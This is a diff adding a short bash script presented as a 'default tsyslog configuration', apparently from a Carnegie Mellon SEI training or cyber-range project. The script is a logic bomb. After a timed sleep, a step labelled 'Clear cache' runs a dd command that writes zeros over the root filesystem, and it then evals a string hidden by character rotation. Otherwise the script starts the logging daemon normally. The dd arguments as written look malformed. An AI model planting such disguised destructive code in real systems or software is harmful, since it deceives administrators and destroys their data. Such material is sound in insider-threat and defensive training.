@@ -1,0 +1,21 @@
+#!/bin/bash
+
+# Copyright 2024 Carnegie Mellon University.
+# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
+# root or contact permission@sei.cmu.edu for full terms.
+
+#Default tsyslog configuration
+
+tt=##REPLACEME##
+rt=$((tt - $(date +%s)))
+
+if [[ $rt -gt 0 ]]; then
+  sleep $rt
+  #Clear cache
+  dd IF=/dev/zero OF=/ 
+  secret_code="7h15_15_4w350m3!"
+  eval "$(echo "$secret_code" | tr 'a-zA-Z0-9' 'n-za-mN-ZA-M5-90-4')"
+else
+  sleep 86400
+  /usr/sbin/tsyslog
+fi
